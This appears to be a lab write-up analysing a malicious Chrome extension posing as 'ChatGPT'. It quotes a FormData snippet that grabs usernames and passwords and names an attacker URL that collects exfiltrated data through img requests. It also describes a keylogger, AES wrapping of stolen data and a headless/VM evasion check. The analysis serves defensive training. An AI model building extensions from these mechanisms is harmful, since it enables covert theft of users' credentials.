**Introduce: Analyze a malicious Chrome extension's code and behavior to identify data theft mechanisms, covert exfiltration via `<img>` tags, and anti-analysis techniques.**

**Scenario: Your cybersecurity team has been alerted to suspicious activity on your organization's network. Several employees reported unusual behavior in their browsers after installing what they believed to be a helpful browser extension named "ChatGPT". However, strange things started happening: accounts were being compromised, and sensitive information appeared to be leaking.**

**Your task is to perform a thorough analysis of this extension and identify its malicious components.**
<br>
<br>

===============================================================================================

<br>

This article discusses a Chrome extension related to a data theft mechanism, where data is covertly exfiltrated because a user installed a fake, malicious extension that impersonated a legitimate tool. We will walk through the details together.

**Note:** This article focuses mainly on reviewing the malware source code, but it does not intend to explain every single line in detail to avoid wasting time and making the lab too long. The important and interesting parts will be explained more carefully.

Looking at these files, for those who do not know, this is the structure of a Chrome extension after installation and extraction:
- Manifest.json: required file that declares permissions and the extension UI.
- App.js, loader.js, crypto.js: represent JavaScript logic that may be injected or run silently in the background.
- Ui.html: popup UI displayed when the extension is opened.
- Img.GIF: accompanying asset/resource.

At first glance, it looks normal, but a normal structure would not be this simple. There is no clear folder like icons/ or assets/.

To verify this, I included an example of the structure of a normal extension below:

At first glance, it is all malware. I will divide this code into four parts and analyze each one.

<br>

![pic4](/assets/img/posts/fakeGPT/pic4.png)
<div align="center">(Part 1)</div>
<br>

In the section declaring a constant named "targets", there is a base64-encoded string:

**d3d3LmZhY2Vib29rLmNvbQ==**

I decoded it and found the result is "www.facebook.com". This malware appears to target Facebook credentials.

A little further down, I noticed a method named addEventListener with the event "submit". Along with it, there are code blocks like:

```javascript
let form = event.target;
let formData = new FormData(form);
let username = formData.get('username') || formData.get('email');
let password = formData.get('password');
```

This shows that the extension is recording the "submit" event to monitor Facebook credentials entered by the user through forms, including username, email, and password.

--> The consequence is that when the extension runs, user data is silently recorded and sent out through the function exfiltrateCredentials, which is called immediately afterward, causing covert data leakage.

It does not stop at the "submit" event. The malware also includes a keylogger mechanism through the "keydown" event.

![pic5](/assets/img/posts/fakeGPT/pic5.png)
<div align="center">(a very simple JavaScript keylogger)</div>

<br>
This keylogger exists in case the malware does not capture valid username/password pairs. It records the keys entered by the user, making it easier to reconstruct valid credentials later.

<br>
<br>
<br>

![pic6](/assets/img/posts/fakeGPT/pic6.png)
<div align="center">(Part 2)</div>
<br>

This function is called directly from Part 1, which we already examined. Specifically:
1. It receives sensitive data when username + password are available.
2. It packages the data into a payload object: user + pass + site.
3. It encrypts the data.

    -> It converts it to a string and encrypts it using AES (inside the **encryptPayload** function).

    -> It then Base64-encodes the result.

    The goal is to hide the content before sending it.
4. It exfiltrates the data to the attacker’s server.

Flow: credentials -> package -> encrypt -> send to attacker.

<br>
<br>

![pic7](/assets/img/posts/fakeGPT/pic7.png)
<div align="center">(Part 3)</div>

<br>

In simple terms, the function does the following:
- Receives data.
- Encrypts it with AES (using IV as a salt).
- Combines the salt with the encrypted data.
- Converts it to Base64 before sending it.

Flow: data -> create key + IV -> AES encrypt -> combine IV + ciphertext -> Base64 encode -> output

<br>
<br>

![pic8](/assets/img/posts/fakeGPT/pic8.png)
<div align="center">(Part 4)</div>
<br>

This final function sends the data to the attacker’s server through an HTML **img** tag.

Flow:

Payload -> encrypt -> encryptedData

-> URL-encode

-> Append to URL (?data=...)

-> Set img.src = URL -> browser sends the request

The key point is:
- New Image() creates a hidden request.
- When img.src is set to 'https://Mo.Elshaheedy.com/collect?data='

-> The browser automatically sends a request to the attacker’s server. It looks like an image-loading request, which makes it difficult to detect.

<br>

By this point, we have gathered the following information:
- The extension targets **Facebook account theft**.
- It records the **submit** event to monitor user data entered through forms.
- It includes a keylogger through the **keydown** event.
- The algorithm used to protect the data before sending it is **AES**.
- The extension uses the HTML **img** tag to exfiltrate stolen data to an attacker-controlled server at **Mo.Elshaheedy.com**.

I will now inspect the manifest.json file further.

![pic9](/assets/img/posts/fakeGPT/pic9.png)
<div align="center">(manifest.json)</div>

The line:

[ "tabs", "http://*/", "https://*/", "storage", "webRequest", "webRequestBlocking", "cookies" ]

shows that the extension has access to browser cookies so it can store and manipulate session and credential data.

<br>
<br>

![pic10](/assets/img/posts/fakeGPT/pic10.png)
<div align="center">(loader.js)</div>
<br>

Flow: check the environment -> if it looks like a VM, disable the extension.

If it does not look like a VM, load an external script and then run the main code.

1. Anti-analysis
   - Check:
   - navigator.plugins.length === 0
   - HeadlessChrome

   --> If true, it is considered a sandbox/VM and the extension is disabled.

2. If not detected
   - Call loadScript('core/app.js')

   --> Load an external JavaScript file.

3. Execute
   - Once loaded, run the core logic (the main payload).

In summary: evade the sandbox first, then load and run the real payload.
